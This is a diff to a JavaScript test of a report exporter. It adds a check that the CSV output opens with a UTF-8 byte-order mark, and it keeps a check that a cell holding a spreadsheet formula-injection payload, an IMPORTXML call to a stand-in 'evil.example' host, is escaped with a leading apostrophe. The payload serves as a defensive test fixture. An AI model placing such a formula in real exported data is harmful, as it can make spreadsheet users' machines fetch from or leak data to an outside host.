@@ -878,7 +878,8 @@ test('governed reports query real PostgreSQL, save, export, schedule and isolate
     assert.ok(reportExports.csv(stock).toString().includes('Copper Clamp'));
     const unsafe={...stock,rows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],
       displayRows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],columns:['product']};
-    assert.match(reportExports.csv(unsafe).toString(),/^"Product"\r\n"'=IMPORTXML/);
+    const unsafeCsv=reportExports.csv(unsafe).toString();assert.equal(unsafeCsv.charCodeAt(0),0xfeff,'the CSV opens in Excel as UTF-8');
+    assert.match(unsafeCsv.slice(1),/^"Product"\r\n"'=IMPORTXML/);
     const accented=await reportExports.pdf({...unsafe,config:{title:'Caf\u00e9'}});
     assert.match(accented.toString('ascii'),/^%PDF-1\.[3-7]/);
     await assert.rejects(()=>reportExports.pdf({...unsafe,config:{title:'\u4e2d\u6587'}}),
